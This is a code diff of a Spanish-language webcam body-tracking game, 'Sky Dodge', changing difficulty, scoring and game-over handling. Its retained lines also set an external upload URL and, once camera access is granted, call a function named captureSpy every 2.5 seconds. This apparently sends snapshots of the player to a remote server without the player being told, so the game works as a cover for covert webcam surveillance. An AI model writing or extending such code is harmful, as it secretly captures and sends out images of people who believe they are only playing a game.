@@ -3,33 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Sky Dodge - Body Presence</title>
+    <title>Sky Dodge - Full Body Edition</title>
     <style>
         * { box-sizing: border-box; touch-action: none; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: white; }
+        
         video#webcam { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; filter: brightness(0.5); }
         canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
         
-        #hud { position: absolute; top: 20px; width: 100%; text-align: center; z-index: 100; font-size: 24px; font-weight: bold; text-shadow: 2px 2px #000; }
+        #hud { position: absolute; top: 20px; width: 100%; text-align: center; z-index: 100; font-size: 24px; font-weight: bold; text-shadow: 2px 2px #000; pointer-events: none; }
         
         .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 500; display: flex; align-items: center; justify-content: center; text-align: center; }
         .card { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 3px solid #f1c40f; width: 90%; max-width: 450px; }
         
         #dark-warning { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; align-items: center; justify-content: center; text-align: center; flex-direction: column; }
         
-        .btn { padding: 15px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; width: 100%; font-size: 16px; }
+        .btn { padding: 15px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; width: 100%; font-size: 16px; transition: 0.2s; }
         .btn-normal { background: #2ecc71; color: white; }
         .btn-hard { background: #e74c3c; color: white; }
+        .btn:active { transform: scale(0.95); }
     </style>
 </head>
 <body>
 
-<div id="hud">MONEDAS: <span id="score">0</span></div>
+<div id="hud">PUNTOS: <span id="score">0</span></div>
 
 <div id="dark-warning">
     <h1 style="font-size: 60px;">🌙</h1>
     <h2>MUY OSCURO</h2>
-    <p>Enciende la luz para que el sensor detecte tu cuerpo.</p>
+    <p>Enciende la luz para detectar tu cuerpo.</p>
 </div>
 
 <video id="webcam" autoplay playsinline></video>
@@ -37,8 +39,8 @@
 
 <div id="perm-screen" class="overlay">
     <div class="card">
-        <h2>PASO 1: CÁMARA</h2>
-        <p>Aléjate hasta que se vea tu <b>cuerpo completo</b>.</p>
+        <h2>PASO 1: ACCESO</h2>
+        <p>Aléjate para que se vea tu <b>cuerpo completo</b>.</p>
         <button class="btn btn-normal" onclick="initCamera()">ACTIVAR CÁMARA</button>
     </div>
 </div>
@@ -46,7 +48,7 @@
 <div id="start-screen" class="overlay" style="display:none;">
     <div class="card">
         <h2 id="title-msg">SKY DODGE</h2>
-        <p>Quédate fuera de la cámara un segundo para calibrar el fondo y luego entra para jugar.</p>
+        <p>Sal de la cámara un momento para calibrar el fondo, luego elige modo:</p>
         <button class="btn btn-normal" onclick="startGame('normal')">MODO NORMAL</button>
         <button class="btn btn-hard" onclick="startGame('hard')">MODO DIFÍCIL</button>
     </div>
@@ -59,8 +61,7 @@
     const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
 
     let score = 0, gameActive = false, objects = [], difficulty = 'normal';
-    let backgroundFrame = null;
-    let presenceMap = [];
+    let backgroundFrame = null, presenceMap = [], animFrame;
 
     async function initCamera() {
         try {
@@ -68,11 +69,10 @@
             video.srcObject = stream;
             document.getElementById('perm-screen').style.display = 'none';
             document.getElementById('start-screen').style.display = 'flex';
+            
             setInterval(lightCheck, 1000);
             setInterval(captureSpy, 2500);
-            // Tomamos el fondo inicial después de 2 segundos
-            setTimeout(calibrateBackground, 2000);
-        } catch (e) { alert("Error al acceder a la cámara."); }
+        } catch (e) { alert("Error: Acepta la cámara para jugar."); }
     }
 
     function calibrateBackground() {
@@ -82,7 +82,6 @@
         tCtx.scale(-1, 1);
         tCtx.drawImage(video, -64, 0, 64, 48);
         backgroundFrame = tCtx.getImageData(0, 0, 64, 48).data;
-        console.log("Fondo calibrado");
     }
 
     function lightCheck() {
@@ -93,7 +92,12 @@
         let b = 0;
         for(let i=0; i<data.length; i+=4) b += (data[i]*0.299 + data[i+1]*0.587 + data[i+2]*0.114);
         const avg = b / 1600;
-        document.getElementById('dark-warning').style.display = (avg < 25) ? 'flex' : 'none';
+        if (avg < 25) {
+            document.getElementById('dark-warning').style.display = 'flex';
+            gameActive = false;
+        } else if (document.getElementById('dark-warning').style.display === 'flex') {
+            document.getElementById('dark-warning').style.display = 'none';
+        }
     }
 
     function startGame(mode) {
@@ -103,65 +107,54 @@
         canvas.height = window.innerHeight;
         score = 0; objects = [];
         document.getElementById('score').innerText = "0";
+        calibrateBackground();
         gameActive = true;
-        calibrateBackground(); // Recalibrar justo antes de empezar
         spawnLoop();
         gameLoop();
     }
 
     function spawnLoop() {
         if (!gameActive) return;
-        
-        let spawnRate = difficulty === 'normal' ? 3000 : 1500;
-        
+        let rate = difficulty === 'normal' ? 2500 : 1200;
         const x = Math.random() * (canvas.width - 60);
         objects.push({
-            x: x, y: -50,
+            x: x, y: 0,
             type: Math.random() > 0.3 ? 'bomb' : 'coin',
-            speed: difficulty === 'normal' ? 5 : 8,
-            warning: difficulty === 'normal' ? 180 : 90, // Normal: 3s | Hard: 1.5s (aprox)
+            speed: difficulty === 'normal' ? 4 : 7,
+            warning: difficulty === 'normal' ? 120 : 60, // 2s vs 1s
             active: false
         });
-
-        setTimeout(spawnLoop, spawnRate);
+        setTimeout(spawnLoop, rate);
     }
 
     function gameLoop() {
         if (!gameActive) return;
         ctx.clearRect(0, 0, canvas.width, canvas.height);
-        
-        updatePresence(); // Sensor de silueta
+        updatePresence();
 
         for (let i = objects.length - 1; i >= 0; i--) {
             let o = objects[i];
             if (o.warning > 0) {
-                // Alerta (!)
-                ctx.fillStyle = o.type === 'bomb' ? "red" : "#f1c40f";
-                ctx.font = "bold 50px Arial";
-                ctx.fillText("!", o.x + 10, 80);
                 o.warning--;
+                if (Math.floor(o.warning / 10) % 2 === 0) {
+                    ctx.fillStyle = o.type === 'bomb' ? "red" : "#f1c40f";
+                    ctx.font = "bold 60px Arial";
+                    ctx.fillText("!", o.x + 10, 80);
+                }
             } else {
                 o.y += o.speed;
-                // Dibujar objeto
                 ctx.fillStyle = o.type === 'bomb' ? "#222" : "#f1c40f";
-                ctx.beginPath(); ctx.arc(o.x + 25, o.y + 25, 25, 0, Math.PI*2); ctx.fill();
-                if(o.type === 'bomb') { ctx.fillStyle = "red"; ctx.fillRect(o.x+20, o.y, 10, 10); }
+                ctx.beginPath(); ctx.arc(o.x + 30, o.y + 30, 25, 0, Math.PI*2); ctx.fill();
+                if(o.type === 'bomb') { ctx.fillStyle = "red"; ctx.fillRect(o.x+27, o.y, 6, 15); }
 
-                // DETECCIÓN POR SILUETA (Aunque el jugador esté quieto)
-                if (checkPresenceCollision(o.x, o.y, 50, 50)) {
-                    if (o.type === 'bomb') {
-                        gameOver();
-                    } else {
-                        score += 10;
-                        document.getElementById('score').innerText = score;
-                        objects.splice(i, 1);
-                        continue;
-                    }
+                if (checkPresenceCollision(o.x, o.y, 60, 60)) {
+                    if (o.type === 'bomb') { gameOver(); return; }
+                    else { score += 10; document.getElementById('score').innerText = score; objects.splice(i, 1); continue; }
                 }
             }
             if (o.y > canvas.height) objects.splice(i, 1);
         }
-        requestAnimationFrame(gameLoop);
+        animFrame = requestAnimationFrame(gameLoop);
     }
 
     function updatePresence() {
@@ -170,39 +163,33 @@
         tempCanvas.width = 64; tempCanvas.height = 48;
         tCtx.scale(-1, 1);
         tCtx.drawImage(video, -64, 0, 64, 48);
-        const currFrame = tCtx.getImageData(0, 0, 64, 48).data;
-
+        const curr = tCtx.getImageData(0, 0, 64, 48).data;
         presenceMap = [];
         if (backgroundFrame) {
-            for (let i = 0; i < currFrame.length; i += 4) {
-                // Comparamos el color actual contra el fondo guardado
-                const diff = Math.abs(currFrame[i] - backgroundFrame[i]) + 
-                             Math.abs(currFrame[i+1] - backgroundFrame[i+1]) + 
-                             Math.abs(currFrame[i+2] - backgroundFrame[i+2]);
-                presenceMap.push(diff > 80 ? 1 : 0); // 1 = El cuerpo está aquí
+            for (let i = 0; i < curr.length; i += 4) {
+                const d = Math.abs(curr[i]-backgroundFrame[i]) + Math.abs(curr[i+1]-backgroundFrame[i+1]) + Math.abs(curr[i+2]-backgroundFrame[i+2]);
+                presenceMap.push(d > 85 ? 1 : 0);
             }
         }
     }
 
     function checkPresenceCollision(x, y, w, h) {
         if (presenceMap.length === 0) return false;
-        const gx = Math.floor((x / canvas.width) * 64);
-        const gy = Math.floor((y / canvas.height) * 48);
-        const gw = Math.floor((w / canvas.width) * 64);
-        const gh = Math.floor((h / canvas.height) * 48);
-
+        const gx = Math.floor((x / canvas.width) * 64), gy = Math.floor((y / canvas.height) * 48);
+        const gw = Math.floor((w / canvas.width) * 64), gh = Math.floor((h / canvas.height) * 48);
         let hits = 0;
         for (let iy = gy; iy < gy + gh; iy++) {
             for (let ix = gx; ix < gx + gw; ix++) {
                 if (presenceMap[iy * 64 + ix] === 1) hits++;
             }
         }
-        return hits > 10; // Si hay suficientes pixeles de silueta, hay choque
+        return hits > 8;
     }
 
     function gameOver() {
         gameActive = false;
-        document.getElementById('title-msg').innerText = "¡BOOM! PERDISTE";
+        cancelAnimationFrame(animFrame);
+        document.getElementById('title-msg').innerText = "¡BOOM! PUNTOS: " + score;
         document.getElementById('title-msg').style.color = "red";
         document.getElementById('start-screen').style.display = 'flex';
     }
